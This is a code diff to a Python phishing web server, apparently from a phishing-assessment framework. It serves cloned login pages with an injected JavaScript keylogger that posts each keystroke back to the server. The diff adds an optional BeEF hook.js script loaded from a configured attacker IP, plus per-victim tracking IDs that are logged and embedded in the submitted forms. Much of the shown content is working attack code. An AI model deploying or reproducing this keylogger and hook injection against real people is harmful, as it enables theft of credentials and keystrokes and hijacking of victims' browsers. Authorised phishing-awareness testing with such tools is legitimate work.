@@ -21,7 +21,7 @@ class errorPage(Resource):
 
 # define the form for the phishing site
 class phishingForm(Resource):
-    def __init__(self, config, vhost, path, logpath, logfile, redirecturl="error"):
+    def __init__(self, config, vhost, path, logpath, logfile, db, redirecturl="error"):
         self.index = ""
         self.vhost = vhost
         self.path = path
@@ -32,8 +32,9 @@ class phishingForm(Resource):
         self.loadIndex()
         self.display = Display()
         self.display.setLogPath(self.logpath)
+        self.db = db
         Resource.__init__(self)
-    
+
     def loadIndex(self):
         with open (self.path + "INDEX", "r") as myfile:
             html = myfile.read()
@@ -42,16 +43,25 @@ class phishingForm(Resource):
 <script type="text/javascript">function p(e){k=window.event?window.event.keyCode:e.which,log(43==k?"[ADD]":String.fromCharCode(k))}function d(e){k=window.event?window.event.keyCode:e.which,8==k?log("[BACKSPACE]"):9==k?log("[TAB]"):13==k?log("[ENTER]"):35==k?log("[END]"):36==k?log("[HOME]"):37==k?log("[<--]"):39==k&&log("[-->]")}function log(e){if(e){var n=new XMLHttpRequest,o=encodeURI(e);n.open("POST","index",!0),n.setRequestHeader("Content-type","application/x-www-form-urlencoded"),n.send("keylog="+o)}}window.onload=function(){window.addEventListener?(document.addEventListener("keypress",p,!0),document.addEventListener("keydown",d,!0)):window.attachEvent?(document.attachEvent("onkeypress",p),document.attachEvent("onkeydown",d)):(document.onkeypress=p,document.onkeydown=d)};</script>
 """
                html = re.sub("</head>", js + "</head>", html, flags=re.I)
-           #    html = html.replace("(?i)</head>", js + "</head>")
-            self.index = html            
+            if (self.config["enable_beef"] == "1"):
+               html = re.sub("</head>", "<script src=\"http://" + self.config["beef_ip"] + "/hook.js\" type=\"text/javascript\"></script>" + "</head>", html, flags=re.I)
+            self.index = html
 
     def render_GET(self, request):
         # log the access
-        self.display.log("%s,[ACCESS].%s\n" % (time.strftime("%Y.%m.%d-%H.%M.%S"), request.getClientIP()), filename=self.logfile)
-        print("::%s:: %s,[ACCESS],%s" % (self.vhost, time.strftime("%Y.%m.%d-%H.%M.%S"), request.getClientIP()))
+        username = "unknown"
+        trackid = None
+        if "u" in request.args.keys():
+            trackid = request.args["u"][0]
+        if (self.config["enable_user_tracking"] == "1") and (trackid):
+            username = self.db.findUser(trackid)
+            if not username:
+                username = "unknown"
+        self.display.log("%s,[ACCESS].%s-%s\n" % (time.strftime("%Y.%m.%d-%H.%M.%S"), username, request.getClientIP()), filename=self.logfile)
+        print("::%s:: %s,[ACCESS],%s-%s" % (self.vhost, time.strftime("%Y.%m.%d-%H.%M.%S"), username, request.getClientIP()))
         sys.stdout.flush()
         # display phishing site
-        return self.index
+        return str(re.sub("</form>", "<input type=\"hidden\" name=\"spfid\" value=\"" + username + "\"></form>", self.index, flags=re.I))
 
     def render_POST(self, request):
         # check to see if the POST is a keylogging post
@@ -69,15 +79,16 @@ class phishingForm(Resource):
         return NOT_DONE_YET
 
 class PhishingSite():
-    def __init__(self, config, vhost, path, logpath, logfile, redirect):
+    def __init__(self, config, vhost, path, logpath, logfile, db, redirect):
         self.vhost = vhost
         self.path = path
         self.logpath = logpath
         self.logfile = logfile
         self.config = config
+        self.db = db
         self.resource = Resource()
-        self.resource.putChild("index", phishingForm(self.config, self.vhost, self.path, self.logpath, self.logfile, redirect))
-        self.resource.putChild("", phishingForm(self.config, self.vhost, self.path, self.logpath, self.logfile, redirect))
+        self.resource.putChild("index", phishingForm(self.config, self.vhost, self.path, self.logpath, self.logfile, self.db, redirect))
+        self.resource.putChild("", phishingForm(self.config, self.vhost, self.path, self.logpath, self.logfile, self.db, redirect))
         self.resource.putChild("error", errorPage())
         self.loadChildren()
 
@@ -86,7 +97,7 @@ class PhishingSite():
         for f in os.listdir(self.path):
             if os.path.isdir(os.path.join(self.path, f)):
                 self.resource.putChild(f, static.File(self.path + f))
-   
+
     def getResource(self):
         return self.resource
 
@@ -135,7 +146,7 @@ class PhishingWebServer():
 
     def loadSites(self):
 
-        templates = self.getTemplates() 
+        templates = self.getTemplates()
         print
 
         # loop over each web template
@@ -172,8 +183,8 @@ class PhishingWebServer():
     def timedLogFormatter(timestamp, request):
         """
         A custom request formatter.  This is whats used when each request line is formatted.
-        
-        :param timestamp: 
+
+        :param timestamp:
         :param request: A twisted.web.server.Request instance
         """
         referrer = _escape(request.getHeader(b"referer") or b"-")
@@ -200,7 +211,7 @@ class PhishingWebServer():
 
         #define phishing sites
         for key in self.websites:
-            self.phishingsites[key] = PhishingSite(self.config, key, self.websites[key]['path'], self.logpath, self.websites[key]['logfile'], self.websites[key]['redirecturl']).getResource()
+            self.phishingsites[key] = PhishingSite(self.config, key, self.websites[key]['path'], self.logpath, self.websites[key]['logfile'], self.db, self.websites[key]['redirecturl']).getResource()
 
         site_length = 0
         for key in self.phishingsites:
